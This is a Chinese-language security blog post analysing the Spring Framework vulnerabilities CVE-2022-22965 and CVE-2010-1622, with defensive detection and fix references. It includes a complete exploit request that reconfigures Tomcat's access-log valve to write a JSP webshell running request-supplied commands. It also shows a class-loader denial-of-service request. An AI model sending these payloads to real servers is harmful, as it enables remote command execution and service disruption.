@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <title>CVE-2022-22965学习-fuzz7j's Blog</title>
+  <meta charset="utf-8" />
+  <meta http-equiv="content-language" content="zh-CN" />
+  <meta name="theme-color" content="#ffffff" />
+  <meta name="supported-color-schemes" content="light dark">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="applicable-device" content="pc,mobile">
+  <meta name="author" content="" />
+  <meta name="description" content="CVE-2022-22965学习"/>
+  <meta name="keywords" content=",Java"/>
+  <link rel="icon" href="/static/img/favicon.ico" />
+  <link rel="apple-touch-icon" href="/static/img/logo.png" />
+  <link rel="stylesheet" href="/static/css/common.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/theme-dark.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/post.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/code-dark.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/code-light.css?t=20230716172519">
+  <link rel="prefetch" href="/static/xml/search.xml?t=20230716172519">
+  <link rel="prefetch" href="/static/js/search.js?t=20230716172519">
+  <script>
+    window.blog = {
+      baseurl:"",
+      buildAt:"20230716172519",
+      darkTheme: false,
+      setDarkTheme: function (dark) {
+        this.darkTheme = Boolean(dark);
+        document.documentElement.className = this.darkTheme ? 'dark': '';
+        document.querySelector('meta[name=theme-color]').setAttribute('content', this.darkTheme ? '#2D2E32': '#FFFFFF');
+      }
+    }
+    if (sessionStorage.darkTheme !== undefined) {
+      blog.setDarkTheme(sessionStorage.darkTheme === 'true'); // 记忆值，单个窗口内有效
+    } else {
+      blog.setDarkTheme(window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches); // 跟随系统
+    }
+    if (window.matchMedia) {
+      var media = window.matchMedia('(prefers-color-scheme: dark)');
+      media.addListener(function (ev) {
+        blog.setDarkTheme(ev.currentTarget.matches);
+        sessionStorage.removeItem('darkTheme');
+      });
+    }
+  </script>
+</head>
+<body ondragstart="return false;">
+<header class="header">
+  <img class="logo" src="/static/img/logo.jpg" alt="logo"/>
+  <nav class="menu">
+    <a href="/" class="hover-underline">首页</a>
+    <a href="/pages/categories" class="hover-underline">归档</a>
+    <a href="/pages/search" class="hover-underline">搜索</a>
+    <a href="/pages/links" class="hover-underline">友链</a>
+    <a href="/pages/about" class="hover-underline">关于</a>
+    </nav>
+</header>
+<div class="page page-post">
+  <h1 class="title" id="CVE-2022-22965学习">CVE-2022-22965学习</h1>
+  
+  <div class="subtitle"> 于 2022-04-03 发布</div>
+  
+  <div class="post">
+    <h2 id="前言">前言</h2>
+
+<p>此漏洞源于云舒的一条微博，不过其实并没有达到“核弹级”，顶多是个手榴弹。
+因为之前没有接触过Autobinding漏洞，正好学习一下，Spring MVC自动绑定漏洞参考这篇文章：<a href="https://www.mi1k7ea.com/2020/02/12/%E6%B5%85%E6%9E%90%E8%87%AA%E5%8A%A8%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E%E4%B9%8BSpring-MVC/?continueFlag=8ed7b47eb07881679eb734eb900f29ba#Edik">浅析自动绑定漏洞之Spring MVC</a></p>
+
+<h2 id="cve-2010-1622">CVE-2010-1622</h2>
+
+<p>CVE-2022-22965是CVE-2010-1622的绕过，<a href="http://blog.o0o.nu/2010/06/cve-2010-1622.html">CVE-2010-1622漏洞发布者原博</a>，所以本篇文章会从CVE-2010-1622开始学习。</p>
+
+<h3 id="测试代码">测试代码</h3>
+
+<p>创建一个JavaBean对象</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="nc">String</span> <span class="n">username</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getUsername</span><span class="o">()</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[+]调用了com.fuzz7j.controller.getUsername"</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">username</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setUsername</span><span class="o">(</span><span class="nc">String</span> <span class="n">username</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[+]调用了com.fuzz7j.controller.setUsername"</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">username</span> <span class="o">=</span> <span class="n">username</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+</code></pre></div></div>
+
+<p>绑定User到HelloController</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RestController</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloController</span> <span class="o">{</span>
+    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/"</span><span class="o">)</span>
+    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">index</span><span class="o">(</span><span class="nc">User</span> <span class="n">user</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getUsername</span><span class="o">());</span>
+        <span class="k">return</span> <span class="s">"success"</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<h3 id="漏洞分析">漏洞分析</h3>
+
+<h4 id="java-beans-api">Java Beans API</h4>
+
+<p>java.beans.Introspector 提供了两种getBeanInfo()方法。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BeanInfo getBeanInfo(Class beanClass)
+BeanInfo getBeanInfo(Class beanClass, Class stopClass)
+</code></pre></div></div>
+
+<p>当没有提供stopClass时，BeanInfo的PropertyDescriptor数组会包含class属性，class属性对应Object.getClass()方法。</p>
+
+<p>如下输出为User.class属性：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Property: class
+Property: username
+</code></pre></div></div>
+
+<p>我们可以进一步枚举Class.class属性：</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">BeanInfo</span> <span class="n">bean</span> <span class="o">=</span> <span class="nc">Introspector</span><span class="o">.</span><span class="na">getBeanInfo</span><span class="o">(</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="nc">PropertyDescriptor</span><span class="o">[]</span> <span class="n">properties</span> <span class="o">=</span> <span class="n">bean</span><span class="o">.</span><span class="na">getPropertyDescriptors</span><span class="o">();</span>
+        <span class="k">for</span> <span class="o">(</span><span class="nc">PropertyDescriptor</span> <span class="n">pd</span> <span class="o">:</span> <span class="n">properties</span><span class="o">)</span> <span class="o">{</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Property: "</span> <span class="o">+</span> <span class="n">pd</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+        <span class="o">}</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Property: annotatedInterfaces
+Property: annotatedSuperclass
+Property: annotation
+Property: annotations
+Property: anonymousClass
+Property: array
+Property: canonicalName
+Property: class
+Property: classLoader
+Property: classes
+Property: componentType
+Property: constructors
+Property: declaredAnnotations
+Property: declaredClasses
+Property: declaredConstructors
+Property: declaredFields
+Property: declaredMethods
+Property: declaringClass
+Property: enclosingClass
+Property: enclosingConstructor
+Property: enclosingMethod
+Property: enum
+Property: enumConstants
+Property: fields
+Property: genericInterfaces
+Property: genericSuperclass
+Property: interface
+Property: interfaces
+Property: localClass
+Property: memberClass
+Property: methods
+Property: modifiers
+Property: module
+Property: name
+Property: nestHost
+Property: nestMembers
+Property: package
+Property: packageName
+Property: primitive
+Property: protectionDomain
+Property: signers
+Property: simpleName
+Property: superclass
+Property: synthetic
+Property: typeName
+Property: typeParameters
+</code></pre></div></div>
+
+<h4 id="spring-beans">Spring Beans</h4>
+
+<p>Spring MVC可以让开发者定义一个JavaBean对象，实现getter和setter方法，之后绑定到表单中，以方便开发人员使用。</p>
+
+<p>当我们提交</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:8080/?username=test
+</code></pre></div></div>
+<p>HelloController会自动把username=test变成对象User.username的值。</p>
+
+<p><img src="1.png" alt="image" /></p>
+
+<p>这里是因为Spring MVC的自动映射功能，会自动发现User对象的public方法和字段，如果出现public的字段，就自动绑定，并且允许通过用户提交请求进行赋值。但当JavaBean对象没有public字段且没有setter方法时，则不允许赋值。</p>
+
+<p>为了支持更复杂的类，Spring还支持”点表示法”。比如：user.username.lastname=test，等于：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frmObj.getUser().getUserName().setLastName("test")  
+</code></pre></div></div>
+
+<p>但Spring Beans的CachedIntrospectionResults类在获取Bean属性时，没有指定stopClass，意味着class属性和后面的属性都可以通过HTTP请求设置。</p>
+
+<p>比如通过下面请求修改ClassLoader的值。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:8080/?class.ClassLoader=
+</code></pre></div></div>
+
+<h3 id="漏洞利用">漏洞利用</h3>
+
+<p>当Spring MVC在Tomcat运行时，会有一个WebappClassLoader来加载/WEB-INF/classes和/WEB-INF/lib下的类。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>org.apache.catalina.loader.WebappClassLoader
+</code></pre></div></div>
+<p>一旦这个类中，出现了可以set的字段，用户就可以提交请求，改变其中的值。</p>
+
+<p>比如 https://www.inbreak.net/archives/377 中提到的修改delegate属性造成DOS攻击。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:8080/?class.classLoader.delegate=false
+</code></pre></div></div>
+
+<p>此漏洞具体利用方式可参考原作者文章。</p>
+
+<h3 id="修复方案">修复方案</h3>
+
+<p>这里因为
+Spring官方修复方案是将 ‘classLoader’和 ‘protectionDomain’ 加入黑名单，禁止任何class对象获取，这也是CVE-2022-22965只在jdk9+下才受影响的原因。</p>
+
+<h2 id="cve-2022-22965">CVE-2022-22965</h2>
+
+<h3 id="exp分析">Exp分析</h3>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:8080</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">test</span><span class="p">:</span> <span class="s">%</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">503</span>
+
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%3c%25%7btest%7diRuntime.getRuntime().exec(request.getParameter(%22cmd%22))%3b%25%7btest%7di%3e%3c!--&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=/app/webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=test&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=00000
+</code></pre></div></div>
+
+<p>这里是利用Tomcat的classLoader修改org.apache.catalina.valves.AccessLogValue的属性，字段信息：
+<img src="2.png" alt="image" /></p>
+
+<p>具体利用方式为修改fileDateFormat导致Tomcat切换日志，修改默认后缀，修改日志存放目录，修改日志格式写Webshell。</p>
+
+<p>添加<code class="highlighter-rouge">test: %</code>原因为写入文件不能存在%，使用占位符替换，来自 https://www.t00ls.cc/viewthread.php?tid=65239</p>
+
+<h4 id="bypass原因">bypass原因</h4>
+
+<p>jdk9开始多了一个模块化的新特性，这里的classLoader不是class获取，而是通过model对象获取的，所以绕过了CVE-2010-1622的补丁。</p>
+
+<p><img src="3.png" alt="image" /></p>
+
+<h3 id="无损检测">无损检测</h3>
+
+<p>参考 https://xz.aliyun.com/t/11129#toc-8 遍历嵌套属性。</p>
+
+<p>发现存在DefaultAssertionStatus属性，作用为设置此类加载器的默认断言状态，参数为boolean型，默认为false。</p>
+
+<p><img src="4.png" alt="image" /></p>
+
+<p>可以通过如下POC进行测试：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:8080/?class.module.classLoader.DefaultAssertionStatus=false
+http://localhost:8080/?class.module.classLoader.DefaultAssertionStatus=666
+</code></pre></div></div>
+
+<p>当目标存在漏洞时，<code class="highlighter-rouge">class.module.classLoader.DefaultAssertionStatus=false</code>返回正常页面。
+<img src="5.png" alt="image" /></p>
+
+<p>而<code class="highlighter-rouge">class.module.classLoader.DefaultAssertionStatus=666</code>因为参数不符合，返回400页面。
+<img src="6.png" alt="image" /></p>
+
+<h3 id="修复方案-1">修复方案</h3>
+
+<p>https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15</p>
+
+<h2 id="参考链接">参考链接</h2>
+
+<p>http://blog.o0o.nu/2010/06/cve-2010-1622.html<br />
+https://www.inbreak.net/archives/377<br />
+https://www.t00ls.cc/viewthread.php?tid=65239<br />
+https://xz.aliyun.com/t/11143<br />
+https://xz.aliyun.com/t/11129</p>
+
+  </div>
+  
+</div>
+<footer class="footer">
+  <span></span>
+  <span text-align: center>Copyright © 2021 fuzz7j</span>
+</footer>
+<div id="to-top">
+  <span></span>
+  <span></span>
+</div><script type="text/javascript" src="/static/js/blog.js?t=20230716172519"></script>
+<script type="text/javascript" src="/static/js/search.js?t=20230716172519"></script></body>
+</html>
